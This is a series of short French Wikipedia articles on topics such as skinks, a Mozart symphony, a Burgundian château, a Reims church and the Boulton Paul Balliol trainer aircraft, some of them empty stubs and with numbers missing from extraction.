<doc id="6806065" url="https://fr.wikipedia.org/wiki?curid=6806065" title="Tytthoscincus atrigularis">
Tytthoscincus atrigularis

Tytthoscincus atrigularis est une espèce de sauriens de la famille des Scincidae.
Répartition.
Cette espèce est endémique des Philippines. Elle se rencontre à Mindanao dans la péninsule de Zamboanga et à Basilan.
Description.
L'holotype mesure de longueur totale dont de longueur standard et de queue.

</doc>
<doc id="6806066" url="https://fr.wikipedia.org/wiki?curid=6806066" title="Symphonie no 26 de Mozart">
Symphonie no 26 de Mozart

La Symphonie en mi bémol majeur, , a été achevée par Wolfgang Amadeus Mozart à Salzbourg le à l'âge de dix-sept ans, un mois après son retour de son troisième voyage en Italie.
Historique.
Les neuf symphonies dites « Salzbourgeoises » ont été écrites entre et . Voir l'historique de la "symphonie ".
Le manuscrit se trouve dans une collection privée à Vienne. La symphonie a été publiée à titre posthume à Hambourg par August Cranz.
Structure.
La symphonie comprend trois mouvements, le dernier mouvement étant enchaîné avec le second.
Durée : environ 
Introduction du "Molto presto" :
\relative c' {
 \tempo "Molto presto"
 \key es \major
 &lt;es g,&gt;4\f r q q8. q16 |
 q4 r q q8. q16 |
 q8 r bes" r g r es r |
 bes8 r g r e2\fp |
 &lt;f as,&gt;4\f
&lt;/score&gt;
Introduction de l"'Andante" :
 \relative c" {
 \version "2.18.2"
 \key ees \major
 \tempo "Andante"
 \time 2/4
 r4 r16 c16-.\p c-. c-.
 g'8 (c,) r16 c16-. c-. c-.
 ees8 (d) r16 d16-. d-. d-.
 f8 (b,) r16 b16-. b-. b-.
 d8 (c) r16 aes'16-. aes-. aes-.
 \relative c" {
 \key ees \major
 \time 2/4
 r2 r16 c,16-.\p c-. c-. g'8 (c,)
 r16 c16-. c-. c-. f8 (aes)
 r16 d,16-. d-. d-. f8 (aes)
 r16 g16-. g-. g-. f8 (d)
»
&lt;/score&gt;
Introduction de l"'Allegro" :
 \relative c" {
 \version "2.18.2"
 \key ees \major
 \tempo "Allegro"
 \time 3/8
 ees,8\p ees ees
 ees ees ees
 ees (d) bes'-!
 aes8 (g) g-!
 c8 (aes) f-! bes (g) ees-!
 bes-! aes' (g) g4 (f8)
 \relative c" {
 \key ees \major
 \time 3/8
 g,4.\p bes aes4 (f'8)
 f (ees) ees-!
 r8 f (c)
 r8 ees (bes)
 r8 f' (ees)
 ees4 (d8)
»
&lt;/score&gt;
Analyse.
Le premier mouvement, "Molto presto", est d'une atmosphère tendue, empreinte d'une discrète inquiétude. Ce mouvement, de manière insolite, s'éteint dans "piano", en douceur, pour s'enchaîner au démarrage "piano" du deuxième mouvement.
Celui-ci est ponctué d'une formule rythmique caractéristique, à la fois légère et tenace, constituée de trois brèves et d'une longue, qui ne cesse de revenir dans une mélancolique récurrence.
La thématique du finale est marquée d'une généreuse ampleur expressive, d'une pureté qu'accentue souvent un doublage à l'octave entre les premiers et seconds violons.

</doc>
<doc id="6806069" url="https://fr.wikipedia.org/wiki?curid=6806069" title="Justyna Ordak">
Justyna Ordak



</doc>
<doc id="6806074" url="https://fr.wikipedia.org/wiki?curid=6806074" title="Physonectae">
Physonectae

Le sous-ordre Physonectae (les physonectaires), est un des trois sous-ordres des siphonophores.
Caractéristiques.
Un physonectaire n'est pas un animal unique mais une colonie de plusieurs organismes, chacun très spécialisé, nommé zooïde. Ce qui le caractérise par rapport aux deux autres sous-ordres des siphonophores est la présence à la fois d'un nectosome et d'un pneumatophore, en plus du siphosome (commun à tous les siphonophores).
Liste des familles.
Le sous-ordre Physonectae possède sept familles valides selon :

</doc>
<doc id="6806077" url="https://fr.wikipedia.org/wiki?curid=6806077" title="Overtime">
Overtime

Overtime est un album du Dave Holland Big Band.
Description.
Sorti en 2005, cet album a néanmoins été enregistré en 2002 à la même période que "What Goes Around" avec un ensemble de musiciens presque identique. La base du big band et le quintet habituel de Holland constitué de Billy Kilson, Steve Nelson, Robin Eubanks et Chris Potter qui sont rejoints par huit autres musiciens. L’album est une démonstration du style de Dave Holland appliqué avec efficacité au format du big band : arrangements complexes et fluctuations rythmiques tout en laissant une grande liberté d’expression aux solistes.
Titres.
Sauf indication, tous les morceaux sont composés par Dave Holland

</doc>
<doc id="6806081" url="https://fr.wikipedia.org/wiki?curid=6806081" title="Sphenomorphus biparietalis">
Sphenomorphus biparietalis



</doc>
<doc id="6806082" url="https://fr.wikipedia.org/wiki?curid=6806082" title="Zaira Nara">
Zaira Nara

Zaira Nara, née le à Boulogne Sur Mer (Argentine), est un mannequin et une animatrice de télévision argentine. Selon le magazine FHM, elle a été classée la plus sexy du monde en 2010. Zaira est la petite sœur de Wanda Nara.
Biographie.
Carrière.
Zaira Nara a commencé sa carrière en tant que modèle lorsqu'elle était enfant. Lors de son adolescence, elle signe un contrat de mannequin pour l'agence Dotto Models. En 2008, Zaira Nara décide de quitter Dotto Models pour rejoindre Chekka Buenos Aires, l'agence de Mauricio Catarain. Elle défile alors pour des prestigieuses marques argentines et signe plusieurs contrats pour devenir l'image de certaines marques de lingerie, vêtements et cosmétiques, tels que Ferli Fragola, Swatch Argentina… Elle fait également partie de Multitalent Agency. Zaira a également fait la couverture des éditions argentines de Cosmopolitan and Women's Health.
Zaira Nara mesure 1.73, est brune aux yeux verts. En 2010, elle participe à l'émission de Marcelo Tinelli, "Bailando por un Sueño" 2010, la version argentine de Danse avec les stars où elle termine à la . La même année, elle présente La Cocina del Show sur Canal 9. En 2011, elle remporte le Ballon Rose qui est attribué à la plus jolie femme de footballeur de l'année. La même année, elle remplace sa sœur Wanda Nara à Bailando 2011 pour cause de grossesse de cette dernière. De juin à , elle a présenté l'émission Tendencia sur Canal 9, une émission sur la mode. Du au , elle présente tous les samedis en deuxième partie de soirée Todos Contentos y bastante locos au côté de Leo Montero. Après un mois d'antenne, l'émission est arrêtée faute d'audience. Depuis , Zaira Nara joue du mercredi au dimanche Los locos Grimaldi au Théâtre Tabaris.

</doc>
<doc id="6806083" url="https://fr.wikipedia.org/wiki?curid=6806083" title="Tytthoscincus biparietalis">
Tytthoscincus biparietalis

Tytthoscincus biparietalis est une espèce de sauriens de la famille des Scincidae.
Répartition.
Cette espèce est endémique de l'archipel de Sulu aux Philippines. Elle se rencontre sur les îles de Basilan, de Jolo, de Lapac, de Tawi-Tawi, de Sanga-Sanga, de Papahag et de Bongao.
Description.
L'holotype mesure de longueur totale dont de longueur standard et de queue.

</doc>
<doc id="6806084" url="https://fr.wikipedia.org/wiki?curid=6806084" title="Entente Sportive Nanterre">
Entente Sportive Nanterre



</doc>
<doc id="6806086" url="https://fr.wikipedia.org/wiki?curid=6806086" title="Château de Bourbilly">
Château de Bourbilly

Le château de Bourbilly est un château du situé sur la commune de Vic-de-Chassenay, en Côte-d'Or.
Situation.
Situé à une dizaine de kilomètres du village de Semur-en-Auxois dans le département de la Côte-d'Or, le château de Bourbilly est aussi connu sous le nom de « château de madame de Sévigné ».
Campé dans la vallée du Serein, le château est entouré d'un superbe parc dessiné par Alphand, dans un vallon sauvage du Serein vanté par Lamartine.
Historique.
Les terres de Bourbilly font partie du fisc royal sous les Mérovingiens et les Carolingiens, elles dépendent alors d'Époisses, habité par la reine Brunehaut et son petit-fils Thierry. Le fief de Bourbilly est transmis à Robert de France, premier duc capétien de Bourgogne, à partir de 1032. Le , Hugues III échange Époisses — et avec Bourbilly — contre Montbard, que lui abandonnait André de Montbard, petit-neveu de saint Bernard. Le fief revient ensuite au frère de ce dernier, Bernard d'Époisses.
C'est au début du que Bourbilly est détaché de la seigneurie d'Époisses, en même temps que Vignes et Chevigny, pour Jean d'Époisses. C'est lui qui fit bâtir une modeste forteresse. En 1270, le fief de Bourbilly fut donné à la fille aînée de Jean d'Époisses, Haramburge, qui épouse Garnier de Traînel. Le fief passe ensuite à sa fille, Alixande de Traînel. Vers 1285, la fille de cette dernière, Agnès de Marigny, recueille sa succession. Bourbilly entre alors dans la famille de son époux, Poincet de Thil. Au début du , Guillaume de Mello, seigneur d'Époisses, conteste la propriété du domaine de Bourbilly à Guillaume de Thil. Le différend sera tranché par Eudes III de Bourgogne le , levant l'emprise des seigneurs d'Époisses sur Bourbilly.
En 1333, la seigneurie passe à la famille de Beaujeu par l'intermédiaire de Marie de Thil. En 1353, à la mort d'Édouard de Beaujeu, Bourbilly va à son fils, Antoine, qui mourut sans enfants le . Ce fut alors à sa sœur, Marguerite de Beaujeu, épouse de Jacques de Piémont, que Bourbilly alla. Dès 1375 elle entreprend de remanier l'édifice pour en faire une demeure de plaisance. Elle fait notamment construire la chapelle, dédiée à sainte Marguerite. Les travaux sont achevés en 1379. Son second fils, Louis de Piémont, hérita de Bourbilly.
Le , Bourbilly est vendu à Pierre de La Trémoille, baron de Dours, conseiller du roi de France Charles VI et chambellan du duc de Bourgogne Philippe "le Bon". En 1405, il confia le château à ses neveux ; à partir de 1410, Guy de La Trémoille fut seul propriétaire du fief. Le château passe à son fils, Louis de La Trémoille, comte de Joigny.
En 1448, le domaine passe à Claude de Montaigu, seigneur de Couches, qui laisse le domaine à sa fille naturelle, Jeanne. Cette dernière apporta la terre à son époux, Hugues de Rabutin, en 1467. Demeure des Rabutin, Jeanne de Chantal, qui y mit au monde ses enfants (dont Celse-Bénigne de Rabutin et Françoise de Rabutin-Chantal), et la marquise de Sévigné, sa petite-fille (fille de Celse-Bénigne), séjournèrent à Bourbilly à plusieurs reprises, notamment lors du voyage de noces de cette dernière. Madame de Sévigné transmet le château à sa fille, Françoise de Grignan. Il sort alors de la famille de Rabutin.
À la mort de madame de Grignan en 1704, sa fille, Pauline de Simiane, hérite de Bourbilly, cette dernière vend le domaine à Guy Chartraire de Saint-Agnan le . La famille Chartraire de Saint-Agnan conservera Bourbilly jusqu'en 1795.
Frédéric-Augustin Pomme le racheta, il fit démolir plusieurs parties du château, le transforma et le vendit le à Antoine-Joseph de Caux, notaire parisien. Les destructions se sont poursuivies, jusqu'à ce que le château connaisse une élégante renaissance à l'époque romantique. Le château passe à sa fille, puis à sa petite-fille, Cécile Belle de Caux, qui épouse Ernest de Franqueville.
Charles de Franqueville, fils de Cécile Belle de Caux et nouveau propriétaire du domaine, entreprit une restauration totale de l'édifice entre 1867 et 1871. La chapelle, en partie détruite par un incendie, a été restaurée en 1952, grâce à une participation collective : de la famille, du sculpteur Yencesse, du médiéviste Surchamp pour la fresque de la Visitation, et du maître verrier Wending pour le vitrail.
Le château a été inscrit provisoirement sur la liste des monuments historiques de 1862. Il ne sera définitivement inscrit sur la liste des monuments historiques de France que par un arrêté du .
Architecture.
Le château, réhabilité au Second Empire, a noble allure dans son parc avec ses trois ailes en équerre, cantonnées de tours rondes, et de ses hautes toitures sur lesquelles se dressent de très belles cheminées cylindriques.
À l'intérieur se visite la salle des gardes dotée d'un billard Louis XIII et d'une tapisserie flamande datant du . La bibliothèque du château est faite de boiseries néogothiques dans lesquelles figure un portrait de sainte Jeanne de Chantal par Philippe de Champaigne.
Le parc a été agrandi et redessiné par Alphand, sous le contrôle d'Ernest de Franqueville. En 1869, ce dernier, en tant que directeur général des ponts et chaussées, exécute le tracé quotté, les nivellements, les travaux hydrauliques ainsi que les plantations nouvelles. Il a reçu le label "Jardin de France".
Lieu de tournage.
En 2015, une équipe de l'émission "Secrets d'Histoire" a tourné plusieurs séquences au château dans le cadre d'un numéro consacré à Madame de Sévigné, intitulée "La marquise de Sévigné, l'esprit du Grand Siècle" diffusée le sur France 2

</doc>
<doc id="6806092" url="https://fr.wikipedia.org/wiki?curid=6806092" title="Michel Guérin (abbé)">
Michel Guérin (abbé)

Michel Guérin, dit l'abbé Guérin, (né le 8 juin 1801, mort le 29 mai 1872) est un prêtre français du , premier curé et fondateur de la paroisse du village de Pontmain, et qui fut témoin de l'apparition de Notre-Dame de Pontmain. Son procès en béatification a été ouvert le .
Biographie.
Michel Guérin est né à Laval en 1801. Il devint vicaire à Saint-Ellier après son ordination. En 1840, il fut nommé premier curé d'un hameau : Pontmain. À son arrivée, tout était à mettre en ordre. Il décida d'abord d'agrandir l'église et d'embellir l'édifice. Tout de suite, ses nouveaux paroissiens prirent confiance en lui. 
L'abbé Guérin aimait particulièrement la Vierge Marie et il fit partager cette dévotion à sa paroisse. Il fonda ainsi la Confrérie de Notre-Dame du Mont-Carmel et du Cœur Immaculé.
Il dédia aussi un autel à la Vierge Immaculée et lui consacra sa paroisse. 
Sa paroisse devenait très pieuse. Après la messe du dimanche, les fidèles restaient pour les vêpres et pour le chapelet. Le curé de Pontmain voulait faire éduquer les enfants de sa paroisse dans les principes de l'Église catholique. C'est ainsi qu'en 1842, il fit bâtir une école et fit venir deux religieuses d'un village voisin. 
L'apparition mariale de Pontmain.
Durant la guerre franco-allemande de 1870, l'abbé Guérin fit célébrer des messes pour les soldats de Pontmain partis combattre. Avant leur départ, il les avait consacrés à la Vierge Marie et leur avait promis qu'ils reviendraient. C'est durant ces années difficiles pour la France que la Vierge Marie se manifesta à quelques enfants (Françoise Richer, Jeanne-Marie Lebossé et les frères Eugène et Joseph Barbedette), dans la soirée du . L'abbé Guérin ne vit pas l'apparition mais fit chanter des louanges à la Vierge par le village. 
En 1872, l'apparition fut reconnue et pendant quelques mois, Michel Guérin s'occupa de l'accueil des pèlerins. Il mourut quelque temps après, le , des suites d'une longue maladie.
Béatification.
Le procès en béatification de l'abbé Guérin a été officiellement ouvert le , lors d'une cérémonie célébrée dans la basilique Notre-Dame de Pontmain, et présidée par Thierry Scherrer, évêque de Laval, avec Yves Le Saux, évêque du Mans. Michel Guérin est considéré par l'Église catholique comme « serviteur de Dieu » ; il deviendra « vénérable » si ses vertus sont reconnues héroïques, à l'issue d'une enquête entamée par Anne Bernet, nommée « postulatrice » de la cause. Pour être béatifié, il faudra ensuite qu'un miracle soit reconnu.

</doc>
<doc id="6806093" url="https://fr.wikipedia.org/wiki?curid=6806093" title="Sphenomorphus aesculeticola">
Sphenomorphus aesculeticola



</doc>
<doc id="6806094" url="https://fr.wikipedia.org/wiki?curid=6806094" title="Tytthoscincus aesculeticola">
Tytthoscincus aesculeticola

Tytthoscincus aesculeticola est une espèce de sauriens de la famille des Scincidae.
Répartition.
Cette espèce est endémique du Sabah en Malaisie orientale.
Description.
Les mâles mesurent de à de longueur standard et les femelles de à .
Étymologie.
Le nom spécifique "aesculeticola" vient du latin ', la chênaie, et de ', habiter, en référence à la distribution de ce saurien.

</doc>
<doc id="6806097" url="https://fr.wikipedia.org/wiki?curid=6806097" title="Gare de Sandvika">
Gare de Sandvika

La gare de Sandvika est une gare ferroviaire qui se situe dans le centre de Sandvika et à d'Oslo.
Histoire.
Avant l'ouverture de la ligne de Kristiania à Drammen, des débats eurent lieu pour savoir où placer les gares de Bærum. Le choix se posa sur Sandvika et Lysaker. Au moment de l'inauguration de la ligne en 1872, seulement 5 trains desservaient par jour Kristiania.
La gare a fait l'objet d'une rénovation importante achevée en juin 2007 pour améliorer l'accessbilité du public.
Service des voyageurs.
Desserte.
La gare est desservie par les lignes de Drammen et d'Asker. De nombreux trains locaux ainsi que le Flytoget s'y arrêtent.
Intermodalité.
La gare est aussi un terminal pour plusieurs lignes de bus : 

</doc>
<doc id="6806099" url="https://fr.wikipedia.org/wiki?curid=6806099" title="Cogad Gáedel re Gallaib">
Cogad Gáedel re Gallaib

Cogad Gáedel re Gallaib (français : Les Guerres des Irlandais contre les Étrangers, anglais : The War of the Gaedhil with the Gaill ou The War of the Irish with the Foreigners) est un texte médiéval irlandais qui évoque les déprédations des Vikings menées par les dynasties Uí Ímair en Irlande et la grande guerre menée contre eux par le roi irlandais Brian Boru.
Le texte.
Le texte commence avec la Bataille de Sulcoit en 967 et culmine avec la bataille de Clontarf en 1014, dans laquelle Brian est tué après que ses forces aient remporté la victoire. La chronique qui compare Brian à Auguste et Alexandre le Grand, est une œuvre de propagande composée au moins de 100 ans après les événements qu'elle décrit, à la gloire de Brian Boru et de ses descendants.
Datation.
Sur la base de la structure des informations reprises dans le texte et des allusions à l'arrière petit-fils de Brian Boru Muircheartach Ua Briain (mort en 1119) qui y figurent il est admis qu'il a été composé pendant la période 1103 à 1111. Le Cogad Gáedel re Gallaib est conservé dans trois textes. Le Livre de Leinster vers. 1160 C.E., le « Manuscrit de Dublin », daté du et le « manuscrit de Bruxelles » de 1635.
Source.
, édition du .

</doc>
<doc id="6806101" url="https://fr.wikipedia.org/wiki?curid=6806101" title="Varzea (genre)">
Varzea (genre)

Varzea est un genre de sauriens de la famille des Scincidae.
Répartition.
Les espèces de ce genre se rencontrent en Amérique du Sud et en Jamaïque.
Liste des espèces.
Selon :
Étymologie.
Ce genre est nommé en référence a sa distribution : la Varzea.

</doc>
<doc id="6806112" url="https://fr.wikipedia.org/wiki?curid=6806112" title="Martti Häikiö">
Martti Häikiö

Martti Johannes Häikiö (né le à Mikkeli et mort le ) est historien et écrivain finlandais. Il est docteur en science politique.
Biographie.
Martti Häikiö a été rédacteur en chef de "Suomen kansallisbiografia" et journaliste pour "Uusi Suomi" et "Kanava". En 1978, il est nommé professeur associé de l'Université de Helsinki. De 1986 à 1988, Häikiö est président de la Suomalaisuuden Liitto dont il devient membre d'honneur en 1996.

</doc>
<doc id="6806113" url="https://fr.wikipedia.org/wiki?curid=6806113" title="Christian Ludwig Ideler">
Christian Ludwig Ideler

Christian Ludwig Ideler, né le à Perleberg et mort le à Berlin, est un astronome et chronologiste prussien.
Biographie.
Après avoir occupé divers postes officiels sous le gouvernement du royaume de Prusse, Christian Ludwig Ideler est devenu professeur à l'Université de Berlin en 1821. De 1816 à 1822, il fut le précepteur des jeunes princes William Frédéric et Charles.
Il a consacré sa vie principalement à l'examen des anciens systèmes de chronologie. En 1825-1826, il a publié son grand ouvrage, "Handbuch der technischen mathematischen und Chronologie" (en 2 volumes, vol. 1, 1825, et vol. 2, 1826, avec une éd., 1883), ainsi qu’une version condensée sous forme d’un "Lehrbuch der Chronologie" (1831), ouvrages suivis d’un volume supplémentaire, "Die Zeitrechnung der Chinesen", paru en 1839.
En 1839, il devint membre étranger de l'Académie des sciences à l'Institut de France.
En 1841, Christian Ludwig Ideler et Jean-Antoine Letronne rédigèrent un ouvrage sur les travaux d'Eudoxe de Cnide.
Il a publié des manuels en langues française et anglaise. Son fils, Julius Ludwig Ideler (1809-1842), philologue et naturaliste, publie sa thèse en 1832 : "Meteorologia Veterum Graecorum et Romanorum — Prolegomena ad novam Meteorologicorum Aristotelis — Editionem adornandam".
L'Union astronomique internationale a donné son nom Ideler à un cratère lunaire.

</doc>
<doc id="6806114" url="https://fr.wikipedia.org/wiki?curid=6806114" title="Unité urbaine de Béziers">
Unité urbaine de Béziers

L'unité urbaine de Béziers est une unité urbaine française centrée sur la ville de Béziers, une des sous-préfectures de l'Hérault, au cœur de la deuxième agglomération du département.
Données générales.
Dans le zonage réalisé par l'Insee en 2010, l'unité urbaine était composée de cinq communes, toutes situées dans le département de l'Hérault, plus précisément dans l'arrondissement de Béziers.
Dans le nouveau zonage réalisé en 2020, elle est composée des cinq mêmes communes.
En , avec , elle représente la urbaine du département de l'Hérault après l'unité urbaine de Montpellier ( départemental et préfecture du département) et avant l'unité urbaine de Sète ( départemental). Elle devance les deux autres unités urbaines de plus de du département que sont Lunel ( départemental) et Agde ( départemental).
En Occitanie où elle se situe, elle occupe le régional après l'unité urbaine d'Alès ( régional) et avant l'unité urbaine de Sète qui se positionne au régional selon les données du recensement de 2022.
En 2022, sa densité de population s'élève à . Par sa superficie, elle représente 2,22 % du territoire départemental mais, par sa population, elle regroupe 7,93 % de la population du département de l'Hérault.
Composition 2020 de l'unité urbaine.
Elle est composée des 5 communes suivantes :
Évolution démographique.
Après un plus-haut en 1975 à , la population a stagné jusqu'en 1999 à pour croître à nouveau depuis cette date, atteignant un plus-haut à en 2022.

</doc>
<doc id="6806116" url="https://fr.wikipedia.org/wiki?curid=6806116" title="Mabuya altamazonica">
Mabuya altamazonica



</doc>
<doc id="6806117" url="https://fr.wikipedia.org/wiki?curid=6806117" title="Varzea altamazonica">
Varzea altamazonica

Varzea altamazonica est une espèce de sauriens de la famille des Scincidae.
Répartition.
Cette espèce se rencontre au Pérou et en Bolivie. Sa présence est incertaine en Équateur.
Description.
C'est un saurien vivipare.

</doc>
<doc id="6806121" url="https://fr.wikipedia.org/wiki?curid=6806121" title="Convention Boumhounan">
Convention Boumhounan

La Convention Boumhounan est un traité signé entre le gouvernement du Québec, Hydro-Québec et le Grand Conseil des Cris en 2002 dans le cadre de la "Paix des Braves". Elle repose sur la création d’un processus de mise en œuvre et de participation à part entière des Cris à l’étude environnementale devant mener à la réalisation du projet de centrales de l’Eastmain-1-A–Sarcelle–Rupert. 

</doc>
<doc id="6806122" url="https://fr.wikipedia.org/wiki?curid=6806122" title="Liste des médaillés français aux championnats d'Europe d'athlétisme">
Liste des médaillés français aux championnats d'Europe d'athlétisme



</doc>
<doc id="6806123" url="https://fr.wikipedia.org/wiki?curid=6806123" title="Convention Nadoshtin">
Convention Nadoshtin

La Convention Nadoshtin est un traité signé en 2002 entre Hydro-Québec, la Société d'énergie de la Baie-James, l'Administration régionale crie, le Grand Conseil des Cris et quatre bandes autochtones qui permet à Hydro-Québec de construire et d’exploiter l'aménagement de l'Eastmain-1, tel que prévu dans la Convention de la Baie-James et du Nord québécois (CBJNQ). Elle vise à encourager des relations de partenariat, en misant sur une volonté commune de poursuivre le développement du Nord-du-Québec, et ce, tout en favorisant l’épanouissement de la nation crie.
La convention, qui s'inscrit dans le cadre de la Paix des Braves de 2002, prescrit des mesures intégrant et favorisant une main-d’œuvre et des entreprises cries en plus de prévoir des fonds pour des travaux correcteurs et une compensation pour les impacts environnementaux de l'aménagement.

</doc>
<doc id="6806124" url="https://fr.wikipedia.org/wiki?curid=6806124" title="Baaqouba">
Baaqouba



</doc>
<doc id="6806129" url="https://fr.wikipedia.org/wiki?curid=6806129" title="Code commune">
Code commune



</doc>
<doc id="6806130" url="https://fr.wikipedia.org/wiki?curid=6806130" title="Varzea bistriata">
Varzea bistriata

Varzea bistriata est une espèce de sauriens de la famille des Scincidae.
Répartition.
Cette espèce se rencontre :
Sa présence est incertaine en Colombie, au Venezuela et au Pérou.
Description.
C'est un saurien vivipare.

</doc>
<doc id="6806131" url="https://fr.wikipedia.org/wiki?curid=6806131" title="Scincus bistriatus">
Scincus bistriatus



</doc>
<doc id="6806132" url="https://fr.wikipedia.org/wiki?curid=6806132" title="Mabuya bistriata">
Mabuya bistriata



</doc>
<doc id="6806133" url="https://fr.wikipedia.org/wiki?curid=6806133" title="Eumeces spixii">
Eumeces spixii



</doc>
<doc id="6806134" url="https://fr.wikipedia.org/wiki?curid=6806134" title="Mabuya agilis">
Mabuya agilis



</doc>
<doc id="6806135" url="https://fr.wikipedia.org/wiki?curid=6806135" title="Mabuya ficta">
Mabuya ficta



</doc>
<doc id="6806136" url="https://fr.wikipedia.org/wiki?curid=6806136" title="Église Saint-Nicaise de Reims">
Église Saint-Nicaise de Reims

À Reims, léglise Saint-Nicaise est une église paroissiale édifiée dans une cité-jardin en style romano-byzantin dans les années 1920. Elle est due à l'architecte Jean-Marcel Auburtin, et décorée par les artistes notables de l'époque : Maurice Denis, Roger de Villiers, Gustave Jaulmes, Emma Thiollier, Jean Berque, René Lalique, Jacques Simon, Ernest Laurent. Elle est classée « monument historique ».
Localisation.
L'église est située avenue de la Marne dans le département français de la Marne, sur la commune de Reims dans la Cité-Jardin du Chemin-Vert.
Historique.
Il existait une autre église qui portait le même nom et qui se trouvait proche de l'abbaye Saint-Rémi. Elle fut vendue et démolie pendant la Révolution française.
Une église dans une cité jardin.
Georges Charbonneaux, fondateur en 1912 de la société d'Habitations à Bon marché (H.B.M.) "Le Foyer Rémois", a souhaité tout au long de sa vie contribuer à l'épanouissement de la famille, en particulier la famille nombreuse, à une époque où la France connaissait un fort déficit de naissances par rapport à ses voisins européens. Après de premières réalisations en 1913 et 1914, il souhaite édifier une cité-jardin sur le modèle anglais théorisé par Ebenezer Howard. Au sortir de la guerre, il engage dès 1919, la construction d'une cité-jardin de , dotée d'équipements sociaux et culturels exceptionnels pour l'époque (maison commune, maison de l'enfance, centres commerciaux, groupe scolaire). Ces maisons sont destinées à accueillir les familles rémoises nombreuses (ouvriers et employés) ayant au minimum quatre enfants. Patron empreint des valeurs du catholicisme social, Georges Charbonneaux souhaite bien sûr édifier une église au sein de ce véritable village.
Jean-Marcel Auburtin, architecte de l'ensemble de la Cité-Jardin, conçoit également l'église Saint-Nicaise, dans un style romano-byzantin tout à fait remarquable avec un plan en forme de croix grecque. Georges Charbonneaux fait intervenir les artistes les plus réputés de l'époque, en particulier ceux impliqués dans le renouveau de l'Art Sacré qui marque cette époque. Ainsi Maurice Denis, cofondateur des Ateliers d'art sacré, y réalise les peintures marouflées des chapelles latérales ayant pour thème l'Annonciation et la Sainte Famille (1926). Gustave Jaulmes, assisté d'Henri Menu, exécute le grand Christ de l'abside au-dessus du maître-autel, ainsi que l'ensemble des peintures murales. Roger de Villiers, sculpteur, réalise une touchante Nativité, ainsi que la statue de saint Nicaise qui orne l'autel et une de Jeanne d'Arc. On doit à Emma Thiollier le tympan (en faux-sgraffite) au-dessus de la porte d'entrée ainsi que la statue de sainte Thérèse. Le chemin de croix, très novateur pour l'époque, est l'œuvre de l'artiste rémois Jean Berque qui réalise là un ensemble tout en douceur et plein de compassion, dans le style propre à la période des Arts décoratifs. L'église, édifiée à partir de , est inaugurée le . Après le décès de Georges Charbonneaux en 1933, son épouse commande la décoration du baptistère à Maurice Denis. Le tympan à l'entrée du baptistère est l'œuvre d'Ernest Laurent (1927).
L'édifice est un exemple de l'architecture religieuse des années 1920, avec une recherche de volumes simples, de matériaux modernes (béton armé, verre moulé), et le respect des formes traditionnelles. L'édifice est classé au titre des monuments historiques en 2002. Il possède un carillon de trente-cinq cloches.
Les vitraux.
Les verrières représentant des anges sont l'œuvre de René Lalique, plus connu pour ses bijoux "Art Nouveau". Il réalise là des sujets de grande dimension en verre moulé d'une exceptionnelle beauté. Ils ont été posés en 1926 et ont fait l'objet d'une restauration en 2022. 
Les vitraux de la tour-lanterne sont de Jacques Simon.
Les Grandes Orgues.
L'église Saint Nicaise de Reims possède un instrument qui a connu une histoire riche en évolution.
Malheureusement, à peine construit, de nombreuses pannes sont à déplorer sur cet orgue. Mr. Gout, de la manufacture Victor Gonzalez, ré-harmonise le cornet au début des années 1930. Il change alors le Salicional 8' du Grand-Orgue en Bourdon 4'.
Voici la composition actuelle de l'instrument :

</doc>
<doc id="6806148" url="https://fr.wikipedia.org/wiki?curid=6806148" title="Boulton Paul Balliol">
Boulton Paul Balliol

Le Boulton Paul Balliol est un avion d'entraînement britannique de l'immédiat après-guerre ayant volé au sein de la Royal Air Force. Il a connu une version navalisée désignée Sea Balliol ayant servi au sein de la Fleet Air Arm. Il est également connu comme le premier avion au monde à avoir volé grâce à un unique turbopropulseur.
Historique.
Développement.
En décembre 1945 l'Air Ministry émit la Specification 7/45 relative à un avion d'entraînement à même de remplacer le North American Harvard alors en service au sein des unités d'instruction de la RAF. Deux constructeurs furent alors mis en concurrence : Avro et Boulton Paul avec des projets relativement similaires. Le premier proposait son tandis que le second présentait son Balliol. L'état-major britannique passa alors commande pour deux prototypes différents.
Le Boulton Paul Balliol se présentait sous la forme d'un monoplan monomoteur biplace doté d'un cockpit dans lequel l'instructeur et son élève s'installaient côte-à-côte. Doté d'une aile basse cantilever et d'un train d'atterrissage classique escamotable il était usiné intégralement en métal. Initialement pensé pour être mû par un turbopropulseur le prototype fut assemblé autour d'un moteur en étoile Bristol Mercury Mk.30 de , une motorisation jugée obsolète par l'Air Ministry. Destiné tout autant à l'entraînement primaire qu'avancé le Balliol fut doté d'un armement permettant l'entraînement au tir. Une mitrailleuse de calibre fut donc installée en position de chasse, c'est-à-dire permettant un tir vers l'avant. Connu sous la désignation constructeur de Boulton Paul P.108, le Balliol réalisa son premier vol le .
Quelques mois plus tard, en juillet 1948 un second prototype de l'avion réalisa son vol inaugural, cette fois ci propulsé par un turbopropulseur Armstrong Siddeley Mamba. Préfigurant un avion de série il fut baptisé Balliol T Mk.1 par la RAF. Malgré l'intérêt industriel d'avoir fait voler le premier monoturbopropulseur au monde, celui-ci ne dépassa pas le stade de l'avion de présérie. L'Air Ministry prit la décision de commander le Balliol doté d'un moteur en V Rolls-Royce Merlin Mk.35 d'une puissance de . Celui-ci entraînait une hélice quadripale en métal. Une commande fut passée pour 196 exemplaires de cette série désignée Balliol T Mk.2.
En septembre 1948 le deuxième prototype du Balliol T Mk.1 fut essayé par la Fleet Air Arm mais avec la motorisation du Balliol T Mk.2. L'avion suscita là encore un certain intérêt si bien que des travaux de navalisation furent entrepris par Boulton Paul, en vue de rendre ces avions aptes à servir depuis les porte-avions de la classe Colossus. Une crosse d'appontage et un train d'atterrissage renforcé furent les principales différences visibles entre le Balliol et le nouvel avion, désigné Sea Balliol T Mk.21.
En service.
Service opérationnel.
Au sein de la RAF le Balliol fut utilisé pour l'entraînement primaire et intermédiaire des futurs pilotes de chasse et de bombardiers entre 1950 et 1957, permettant ainsi d'envoyer à la casse les derniers Harvard. Ces avions furent en fait les derniers avions à pistons employés pour l'entraînement intermédiaire, avant l'arrivée des De Havilland Vampire T Mk.11. Parmi toutes les unités britanniques qui volèrent sur cet avion c'est la No. 7 Flying Training School, unité de la Central Flying School, qui utilisa le plus grand nombre de Balliol T Mk.2.
Dans la Fleet Air Arm le Sea Balliol T Mk.21 eut un rôle assez similaire à celui des Balliol de la RAF. En effet mis à part l'entraînement avancé des pilotes de Westland Wyvern ceux-ci remplissaient des missions d'entraînement primaire et secondaire. C'est sur cet avion que, de 1950 à 1961 les jeunes pilotes de la marine britannique apprenaient à apponter. Ils furent là encore remplacés par des jets.
